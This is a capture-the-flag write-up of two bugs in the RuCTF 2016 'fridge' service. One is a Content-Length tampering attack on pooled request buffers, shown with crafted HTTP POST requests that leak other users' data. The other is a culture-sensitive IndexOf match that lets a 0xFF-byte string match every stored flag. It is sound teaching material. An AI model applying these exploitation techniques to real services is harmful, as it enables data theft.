## ƒrɪʤ exploits

### Content-Length tampering
fridge service use static pool of buffers to handle POST-requests (to reduce memory traffic :). The pool is actually a queue, so sequential requests use the same buffer. 
The vulnerability lies in fact of using [Content-Length](https://github.com/HackerDom/ructf-2016/blob/master/services/fridge/src/http/RequestAsyncHelper.cs#L43) field value as a length of posted data.
Bad news, Mono runtime allows to handle requests with `Content-Length` set greater than actual number of bytes sent.
So, the exploit can use suffix bytes of previous requests simultaneously overriding prefix data such as `csrf-token`.

Checker POST data:
```http
POST /signup HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 138
Cookie: csrf-token=F8031998238704D31A2A7ED947B34D75

csrf-token=F8031998238704D31A2A7ED947B34D75&login=FoodBot+0x3d42f02b&pass=7b6196d28&allergen=merluza%2C+FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLA%3D
```

Our POST request:
```http
POST /signup HTTP/1.1
Host: 127.0.0.1:8888
Cookie: csrf-token=00000000000000000000000000000000
Content-Length: 150

csrf-token=00000000000000000000000000000000&login=The_Fridge_Hacker1&pass=xxxx&q=
```

The result is:
`csrf-token=00000000000000000000000000000000&login=The_Fridge_Hacker1&pass=xxxx&q=` **+** `28&allergen=merluza%2C+FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLA%3D` **+** some other bytes

You should carefully select `Content-Length` header value because of other requests, which place `csrf-token` field at the end of data. That's why my exploit didn't work on services review :)

You can also use second request to overwrite data in buffer and prevent other teams to get flags. You only need to listen websocket for registration of `FoodBot 0x` users.

### Substring matching
The second vulnerability: using [IndexOf](https://github.com/HackerDom/ructf-2016/blob/master/services/fridge/src/utils/StringUtils.cs#L20) method, which in fact do complex Unicode string matching (note about Culture for example). And moreover some unicode character are considered as insignificant to IndexOf method.
You can read some information here: http://csharpindepth.com/Articles/General/Strings.aspx#culture. The exploit can register new user with one allergen `%FF%FF%FF... (31 byte)`, which match all flags posted by checksystem as allergens!

Try it out:
```csharp
"abc".IndexOf(Encoding.UTF8.GetString(Enumerable.Repeat((byte)0xff, 100500).ToArray()))
```
